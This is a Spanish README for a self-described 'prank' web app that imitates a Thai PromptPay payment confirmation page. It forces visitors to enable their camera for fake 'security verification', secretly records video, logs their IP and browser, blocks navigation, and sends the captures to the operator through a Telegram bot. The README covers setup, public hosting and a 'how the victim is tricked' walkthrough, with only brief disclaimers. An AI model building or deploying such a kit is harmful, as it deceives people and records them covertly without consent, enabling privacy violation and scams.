# 🎭 Web de Broma - Simulador de Pago QR Thailand

Una aplicación web de broma que simula ser una página de confirmación de pago QR de Tailandia. La página obliga al usuario a activar su cámara para "verificación de seguridad" y graba un video secretamente.

## 🎯 Características

- ✅ **Simulación auténtica** de página de pago PromptPay Thailand
- 🎥 **Grabación automática** de video (10 segundos)
- 📊 **Registro de IPs** y datos de acceso
- 🚫 **Bloqueo de navegación** hasta completar "verificación"
- 🌍 **Interfaz bilingüe** (Tailandés/Inglés)
- 📱 **Diseño responsive** para móviles
- 🔒 **Panel de administración** para ver videos y logs

## 🚀 Instalación Local

### Requisitos
- Node.js (versión 14 o superior)
- npm o yarn

### Pasos de instalación

1. **Clonar/descargar el proyecto**
   ```bash
   cd webparaelestafas
   ```

2. **Instalar dependencias**
   ```bash
   npm install
   ```

3. **Ejecutar el servidor**
   ```bash
   npm start
   ```

4. **Acceder a la aplicación**
   - Web principal: `http://localhost:3000`
   - Ver logs: `http://localhost:3000/admin/logs`
   - Ver videos: `http://localhost:3000/admin/videos`

## 📁 Estructura del proyecto

```
webparaelestafas/
├── server.js              # Servidor backend
├── package.json           # Dependencias del proyecto
├── public/                # Archivos estáticos
│   ├── index.html        # Página principal (simulador de pago)
│   ├── styles.css        # Estilos CSS
│   └── script.js         # JavaScript frontend
├── videos/               # Videos grabados (se crea automáticamente)
├── logs/                 # Logs de acceso (se crea automáticamente)
└── README.md             # Este archivo
```

## 🌐 Opciones de Alojamiento

### 1. **Heroku** (Recomendado - Gratis)

```bash
# Instalar Heroku CLI
npm install -g heroku

# Inicializar git (si no lo has hecho)
git init
git add .
git commit -m "Initial commit"

# Crear app en Heroku
heroku create tu-nombre-app-unico

# Desplegar
git push heroku main
```

**Ventajas:** Gratis, fácil, dominio HTTPS automático
**Desventajas:** La app se "duerme" después de 30 min sin uso

### 2. **Railway** (Muy fácil)

1. Ve a [railway.app](https://railway.app)
2. Conecta tu repositorio de GitHub
3. Despliega automáticamente

### 3. **Vercel** (Para frontend + Serverless)

```bash
npm install -g vercel
vercel
```

### 4. **Render** (Alternativa a Heroku)

1. Ve a [render.com](https://render.com)
2. Conecta tu repositorio
3. Configura como "Web Service"

### 5. **VPS Propio** (Más control)

```bash
# En tu servidor VPS
git clone tu-repositorio
cd webparaelestafas
npm install
npm install -g pm2

# Ejecutar en background
pm2 start server.js --name "broma-web"
pm2 startup
pm2 save

# Configurar nginx (opcional)
sudo nano /etc/nginx/sites-available/tu-dominio
```

## 🔧 Configuración

### Variables de entorno (IMPORTANTE)

Crear archivo `.env` en la raíz del proyecto:
```env
PORT=3000
NODE_ENV=production

# Configuración Telegram Bot (OBLIGATORIO)
TELEGRAM_BOT_TOKEN=tu_token_del_bot
TELEGRAM_CHAT_ID=tu_chat_id
```

### 🤖 Configurar Telegram Bot

1. **Crear bot:**
   - Busca `@BotFather` en Telegram
   - Envía `/newbot`
   - Elige nombre y username
   - Copia el TOKEN

2. **Obtener Chat ID:**
   - Envía mensaje a `@userinfobot`
   - Copia tu Chat ID

3. **Configurar variables:**
   ```bash
   TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
   TELEGRAM_CHAT_ID=987654321
   ```

### Personalización

**Cambiar la cantidad del pago:**
Edita `public/index.html` línea con `฿6,100.00`

**Cambiar tiempo de grabación:**
Edita `public/script.js` línea con `setTimeout(() => { this.stopRecording(); }, 10000);`

**Cambiar nombre del comercio:**
Edita `public/index.html` línea con `Bangkok Digital Store`

## 📊 Panel de Administración

### 📱 Notificaciones Telegram (PRINCIPAL)
Recibirás mensajes automáticos en Telegram con:
- 🎯 **Acceso inicial:** IP, navegador, hora
- ⚠️ **Cámara denegada:** IP y timestamp
- 🎉 **Video capturado:** IP, video file, datos completos

### Ver logs de acceso
```
http://tu-dominio.com/admin/logs
```
Muestra:
- IPs de visitantes
- Navegadores utilizados
- Timestamps de accesos
- Acciones realizadas

### Ver videos grabados
```
http://tu-dominio.com/admin/videos
```
Permite:
- Listar todos los videos
- Reproducir videos
- Descargar videos

### Estructura de archivos generados

**Videos:** `videos/video_FECHA_IP.webm`
**Logs:** `logs/access.log`

## 🎭 Cómo funciona la broma

1. **Víctima accede** a la URL que le envías
2. **Ve confirmación** de pago exitoso por ฿6,100.00
3. **Mensaje de seguridad** requiere verificación por cámara
4. **Debe aceptar** permisos de cámara (obligatorio)
5. **Se graba video** automáticamente por 10 segundos
6. **Mensaje de éxito** con confetti
7. **Recibes INMEDIATAMENTE** en Telegram: video + IP + datos

## ⚠️ Consideraciones Importantes

### Legal
- Solo usar con amigos/familiares
- No para propósitos maliciosos
- Verificar leyes locales sobre grabación

### Técnico
- Los videos se almacenan en el servidor
- Requiere HTTPS para funcionar en móviles
- Los archivos pueden ocupar espacio

### Privacidad
- Eliminar videos después de la broma
- No compartir contenido grabado sin permiso
- Usar solo para entretenimiento

## 🛠️ Comandos útiles

```bash
# Desarrollo con auto-reload
npm run dev

# Ver logs en tiempo real
tail -f logs/access.log

# Limpiar videos antiguos
rm videos/*.webm

# Ver espacio usado
du -sh videos/ logs/

# Backup de datos
tar -czf backup.tar.gz videos/ logs/
```

## 🎨 Personalización Avanzada

### Cambiar colores/tema
Editar `public/styles.css`

### Agregar más idiomas
Editar `public/index.html` y `public/script.js`

### Cambiar país/moneda
Modificar símbolos y textos en `public/index.html`

## 🐛 Solución de problemas

**La cámara no funciona:**
- Verificar que el sitio use HTTPS
- Comprobar permisos del navegador

**Los videos no se guardan:**
- Verificar permisos de escritura en carpeta `videos/`
- Comprobar espacio en disco

**La página no carga:**
- Verificar que el puerto 3000 esté libre
- Comprobar logs del servidor

## 📞 Soporte

Si tienes problemas, verifica:
1. Versión de Node.js
2. Permisos de archivos
3. Logs del servidor (`npm start`)
4. Consola del navegador (F12)

## 🎉 ¡Disfruta la broma!

Recuerda usar esta herramienta de manera responsable y solo para diversión entre conocidos. ¡La cara de sorpresa de tu amigo será épica! 😄 